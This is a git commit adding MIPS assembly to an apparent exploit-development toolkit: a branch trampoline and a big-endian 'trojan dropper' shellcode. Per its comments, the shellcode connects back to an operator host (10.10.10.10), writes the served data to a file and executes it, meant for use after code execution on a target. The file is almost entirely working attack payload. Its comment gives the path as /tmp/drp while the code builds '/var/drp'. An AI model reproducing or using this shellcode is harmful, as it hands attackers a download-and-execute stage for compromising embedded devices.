28fdbd725a6c8cd8138e9321a5a2d3e5677f603f
Zachary Cutlip <uid000@gmail.com>
2013-11-07 13:04:16 -0500

    MIPS Assembly files to go with the MIPS payloads

---
+++ src/bowcaster/contrib/asm/mips/trampoline.s
@@ -0,0 +1,6 @@
+.set noat
+.set noreorder
+
+beq $t7,$t7,-728
+xor  $t7,$t7,$zero
+
---
+++ src/bowcaster/contrib/asm/mips/trojan-dropper-mips-be.s
@@ -0,0 +1,174 @@
+/* 
+ * *******************************************************************************
+ * *******************************************************************************
+ * *****************       These warez are licensed GPLv2.        ****************
+ * *********************    So share and respect.  Peace.   **********************
+ * *******************   See included LICENSE for more info.   *******************
+ * *******************************************************************************
+ * *******************************************************************************
+ * ************************                               ************************
+ * ************                                                       ************
+ * *********     #####   ######   #######  #######  #######  #######     *********
+ * *******      #     #  #     #  #        #           #          #        *******
+ * *******      #        #     #  #        #           #         #         *******
+ * *******      #  ####  ######   #####    #####       #        #          *******
+ * *******      #     #  #   #    #        #           #       #           *******
+ * *******      #     #  #   #    #        #           #       #           *******
+ * *******       #####   #     #  #######  #######     #     #######       *******
+ * *********                                                             *********
+ * ************                                                       ************
+ * ************************  From your leet hacking cr3w  ************************
+ * *******************************                 *******************************
+ * **********************************    at     **********************************
+ * *******************************                 *******************************
+ * ****                                                                       ****
+ * ****   TTTTTTTTTTTTTTTTTTTTTTTNNNNNNNN        NNNNNNNN   SSSSSSSSSSSSSSS   ****
+ * ****   T:::::::::::::::::::::TN:::::::N       N::::::N SS:::::::::::::::S  ****
+ * ****   T:::::::::::::::::::::TN::::::::N      N::::::NS:::::SSSSSS::::::S  ****
+ * ****   T:::::TT:::::::TT:::::TN:::::::::N     N::::::NS:::::S     SSSSSSS  ****
+ * ****   TTTTTT  T:::::T  TTTTTTN::::::::::N    N::::::NS:::::S              ****
+ * ****           T:::::T        N:::::::::::N   N::::::NS:::::S              ****
+ * ****           T:::::T        N:::::::N::::N  N::::::N S::::SSSS           ****
+ * ****           T:::::T        N::::::N N::::N N::::::N  SS::::::SSSSS      ****
+ * ****           T:::::T        N::::::N  N::::N:::::::N    SSS::::::::SS    ****
+ * ****           T:::::T        N::::::N   N:::::::::::N       SSSSSS::::S   ****
+ * ****           T:::::T        N::::::N    N::::::::::N            S:::::S  ****
+ * ****           T:::::T        N::::::N     N:::::::::N            S:::::S  ****
+ * ****         TT:::::::TT      N::::::N      N::::::::NSSSSSSS     S:::::S  ****
+ * ****         T:::::::::T      N::::::N       N:::::::NS::::::SSSSSS:::::S  ****
+ * ****         T:::::::::T      N::::::N        N::::::NS:::::::::::::::SS   ****
+ * ****         TTTTTTTTTTT      NNNNNNNN         NNNNNNN SSSSSSSSSSSSSSS     ****
+ * ****                                                                       ****
+ * ****                                                                       ****
+ * ************                http://www.tacnetsol.com                ***********
+ * ***************                                                  **************
+ * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMWo,:OMMMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMK.    ;MMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMX,''''cMMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMMMNxxkWM;    0MMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMMM,   cM'    xMMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMM0.o,.'   :X.    lMMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMXcO:.'   ;k     ;MMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMXoKc.'   ;x     .MMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMM0.c..'   ;o     .MMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMWOlod'   ;l      O0MMMMMN0MMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMM0lllld;...''......,',:;. .cNMMMMMMM**************
+ * ***************MMMMMMMMMMMMMOlllo:.   ...............,0MMMMMMMMMM**************
+ * ***************MMMMMMMMMMMOllllll;:l;   ,xXX0XXXooooollOMMMMMMMMM**************
+ * ***************MMMMMMMMMOlllc;;'.,.,'   ,oMMKMMMlllllllllOMMMMMMM**************
+ * ***************MMMMMMMOlc;,..'... .''   ,oMMKMMM;,;llllllllkWMMMM**************
+ * ***************MMMMMOl:'.'.....  . .'   ,oMMKMMM;''',clllllllkWMM**************
+ * ***************MMMOl:'.... ..   .  .'   ,oMMKMMM' ..'.'cllllllckW**************
+ * ***************MMdc'....  ..   .   .'   ,oMMKMMM'..  ..',llllllcx**************
+ * ***************MMMXl... ..    .    .'   ,oMMKMMM. .. .....cllcxNM**************
+ * ***************MMMMMXc  .     .    .'   ,oMMKMMM.  .   ....cxNMMM**************
+ * ***************MMMMMMMNl     .     .'   ,oMMKMMM'   .   . oNMMMMM**************
+ * ***************MMMMMMMMMNc   .  .........;xKKMMM.    . .lNMMMMMMM**************
+ * ***************MMMMMMMMMMMNl ...    .....   .cXM.    .lNMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMN; ....,  . .lkx;  k.   oWMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMK 'k.    ..  oMMKx .;.dWMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMN .KWo.      oMMXc .xWMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMM0. .,''... ',;,  ,NKMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMO:.   ...   .:KMMKMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMWKOkkx;lWMKMMMKMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMKWMKMMKWMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMKWKMNXMMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOXNMMMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWMMMMMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM**************
+ * ***************MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM**************
+ * *******************************************************************************
+ * *******************************************************************************
+ * 
+ * (c) 2012 Zachary Cutlip <zcutlip@tacnetsol.com>,
+ *          Tactical Network Solutions, LLC
+ * 
+ * This MIPS big-endian shellcode will connect back to the operator, read whatever
+ * is served up, write that data to /tmp/drp, and attempt to execute that file.
+ * 
+ * One recommended usage is to serve up a dual-purpose trojan (see accomapanying
+ * stage 2) that first drops a second file (e.g, tftp client), and then establishes
+ * a connect-back shell to the operator.
+ * 
+ * This is ideal for situations where you can get execution on the system but have
+ * no way of transferring files.  
+ */
+
+.set noat
+/* open file */
+lui	$t7,0x2f76 /* /v */
+ori	$t7,0x6172 /* ar */
+sw	$t7,-12($sp)
+lui	$t6,0x2f64 /* /d */
+ori	$t6,0x7270 /* rp */
+sw	$t6,-8($sp)
+sw	$zero,-4($sp)
+addiu	$a0,$sp,-12
+li	$a1,0x111 /* O_CREAT|O_WRONLY */
+li	$a2,0x1ff /* 0777 */
+li	$v0,4005	/* sys_open */
+syscall	0x40404
+sw	$v0,-44($sp)
+
+/* connect */
+li	$t7,-3
+nor     $a1,$t7,$zero
+sw      $a1,-32($sp) /* This puts AF_INET (2) into the sockaddr struct we'll need later  */
+lw      $a0,-32($sp) /* this gets 2 into $a0 without a 0x20 in the shellcode */
+slti    $a2,$zero,-1
+li      $v0,4183 /*( sys_socket ) */
+syscall 0x40404
+sw      $v0,-1($sp)
+lw      $a0,-1($sp)
+/* li      $t7,-3 /*( sa_family = AF_INET ) */
+/* nor     $t7,$t7,$zero */
+/* sw	$t7,-32($sp) */
+lui     $t6,0x7a69 /*( sin_port = 0x7a69 )*/
+ori     $t6,$t6,0x7a69
+sw      $t6,-28($sp)
+lui     $t5,0x0a0a     /*( sin_addr = 0xa0a0 ... */
+ori     $t5,$t5,0x0a0a  /*        ...0a0a ) 10.10.10.10*/
+sw      $t5,-26($sp)
+addiu    $a1,$sp,-30
+li      $t4,-17 /*( addrlen = 16 )    */
+nor     $a2,$t4,$zero
+li      $v0,4170 /*( sys_connect ) */
+syscall 0x40404
+
+/* prep first "write" to be 0 in size */
+slti    $a2,$zero,-1
+write_file:
+  lw      $a0,-44($sp)
+  addiu   $a1,$sp,-48
+  /* On 1st pass $a2 has 0, so this write is inert */
+  /* on 2nd+ pass $a2 should have 1 from the 1 byte read */
+  li      $v0,4004 /*sys_write*/
+  syscall 0x40404
+
+/* read from socket */
+lw      $a0,-1($sp)
+addiu   $a1,$sp,-48
+slti    $a2,$zero,0x0fff
+li      $v0,4003 /*sys_read */
+syscall 0x40404
+bgtz    $v0,write_file
+
+/* close socket */
+li      $v0,4006
+syscall 0x40404
+/* close dropped file */
+lw      $a0,-44($sp)
+li      $v0,4006
+syscall 0x40404
+
+/* exec /tmp/drp */
+addiu $a0,$sp,-12 /* a0 contains char * "/tmp/drp" */
+sw    $a0,-48($sp) /* copy char * to stack for first elem in char ** */
+sw    $v0,-44($sp) /* hopefully v0 contains 0 from close()?  Copy NULL to stack for 2nd
+                   /* elem in char ** */
+/*addiu $a1,$sp,-48 */ /* Reusing stack addr from read/write loop, already in a1 */
+slti    $a2,$zero,-1
+li  $v0,4011  /* sys_execve */
+syscall 0x40404
+
